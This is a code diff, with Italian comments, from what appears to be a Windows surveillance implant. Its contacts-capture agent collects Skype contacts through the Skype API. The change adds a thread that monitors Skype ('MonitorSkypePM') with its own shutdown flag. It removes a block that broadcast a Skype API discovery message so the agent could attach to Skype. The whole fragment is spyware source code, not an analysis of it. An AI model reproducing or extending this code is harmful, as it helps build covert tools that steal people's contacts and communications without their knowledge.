@@ -8,6 +8,9 @@ BOOL bPM_ContactsStarted = FALSE;	// Indica se l'agente e' attivo o meno
 HANDLE hContactsThread = NULL;		// Thread di cattura
 DWORD g_contact_delay = 0;			// Il delay deve essere assoluto (non deve ricominciare ad ogni sync)
 
+BOOL bPM_cnspmcp = FALSE; // Semaforo per l'uscita del thread
+HANDLE hCnSkypePMThread = NULL;
+
 typedef struct _ContactHeader{
         DWORD           dwSize;
         DWORD           dwVersion;
@@ -181,16 +184,7 @@ DWORD __stdcall PM_ContactsDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILET
 		if (skype_api_wnd && skype_pm_wnd)
 			SendRequestContacts(skype_api_wnd, skype_pm_wnd);
 		return 1;
-	} else if (dwFlags & FLAGS_SKAPI_ATT) {
-		// Deve mandare il messaggio per il discovery
-		UINT msg_type = RegisterWindowMessage("SkypeControlAPIDiscover");
-		for (int i=0; i<30; i++) {
-			if (HM_SafeSendMessageTimeoutW(HWND_BROADCAST, msg_type, (WPARAM)g_report_hwnd, (LPARAM)NULL, SMTO_NORMAL, 500, NULL))
-				break;
-		}
-		return TRUE;
 	}
-
 }
 
 
@@ -215,8 +209,12 @@ DWORD __stdcall PM_ContactsStartStop(BOOL bStartFlag, BOOL bReset)
 
 		// Crea il thread che cattura i contatti
 		hContactsThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CaptureContactsThread, NULL, 0, &dummy);
+		hCnSkypePMThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorSkypePM, NULL, 0, &dummy);
+
 	} else {
 		QUERY_CANCELLATION(hContactsThread, g_bContactsForceExit);
+		QUERY_CANCELLATION(hCnSkypePMThread, bPM_cnspmcp);
+
 	}
 
 	return 1;
